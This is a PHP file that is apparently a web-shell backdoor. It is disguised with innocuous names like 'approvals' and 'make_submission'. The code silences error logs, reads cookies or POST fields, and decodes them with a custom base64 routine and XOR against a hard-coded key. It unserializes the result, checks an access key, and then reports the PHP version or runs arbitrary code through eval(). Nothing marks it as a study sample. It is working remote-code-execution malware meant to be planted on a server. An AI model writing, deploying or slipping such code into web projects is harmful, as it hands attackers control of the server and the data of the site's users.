<?php
@ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @set_time_limit(0);


    $approvals = False;

    foreach ($_COOKIE as $cookie_one=>$cookie_two)
    {
        $approvals = $cookie_two;

        $manager_invitation = $cookie_one;

        $approvals = remove_letter(_base64_decode($approvals), $manager_invitation);
        
        if ($approvals)
        {
            break;
        }
    }

    function improve_meta()
    {
        return _base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH");
    }

    function append_strings($append, $string)
    {
        return $append ^ $string;
    }

    if (!$approvals)
    {
        foreach ($_POST as $contribute=>$research)
        {
            $approvals = $research;
            
            $manager_invitation = $contribute;

            $approvals = remove_letter(_base64_decode($approvals), $manager_invitation);
            
            if ($approvals)
            {
                break;
            }            
        }
    }

    function make_submission($people, $collaborate)
    {
        $confirm_invite = "";

        for ($i=0; $i<strlen($people);)
        {
            for ($j=0; $j<strlen($collaborate) && $i<strlen($people); $j++, $i++)
            {
                $extension_param = ord($people[$i]) ^ ord($collaborate[$j]);

                $confirm_invite = $confirm_invite . chr($extension_param);
            }
        }

        return $confirm_invite;
    }

    if (!isset($approvals['ak']) || !(append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')) == $approvals['ak'])
    {
        $approvals = Array();
    }
    else
    {
        switch ($approvals['a']){
            case "i":
                $array = Array();
                $array['pv'] = @phpversion();
                $array['sv'] = '1.0-1';
                echo @serialize($array);
                break;
            case "e":
                eval($approvals['d']);
                break;
        }
        exit();

    }

    function remove_letter($data, $key)
    {
        return @unserialize(screen_submission($data, $key));
    }



    function screen_submission($sub_key, $sub_meta)
    {
        $sub = make_submission($sub_key, append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'));

        return make_submission($sub, $sub_meta);
    }

    function _base64_decode($input)
    {
        $buffer = "";
        $tbl = Array(
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54,
            55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2,
            3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
            20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30,
            31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,
            48, 49, 50, 51, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1);

        for ($i = 0; $i < strlen($input); ) {
            $b = 0;
            if ($tbl[ord($input[$i])] != -1) {
                $b = ($tbl[ord($input[$i])] & 0xFF) << 18;
            }
            else {
                $i++;
                continue;
            }

            $num = 0;
            if ($i + 1 < strlen($input) && $tbl[ord($input[$i+1])] != -1) {
                $b = $b | (($tbl[ord($input[$i+1])] & 0xFF) << 12);
                $num++;
            }

            if ($i + 2 < strlen($input) && $tbl[ord($input[$i+2])] != -1) {
                $b = $b | (($tbl[ord($input[$i+2])] & 0xFF) << 6);
                $num++;
            }

            if ($i + 3 < strlen($input) && $tbl[ord($input[$i+3])] != -1) {
                $b = $b | ($tbl[ord($input[$i+3])] & 0xFF);
                $num++;
            }

            while ($num > 0) {
                $c = ($b & 0xFF0000) >> 16;
                $buffer .=chr($c);
                $b <<= 8;
                $num--;
            }
            $i += 4;
        }
        return $buffer;
    }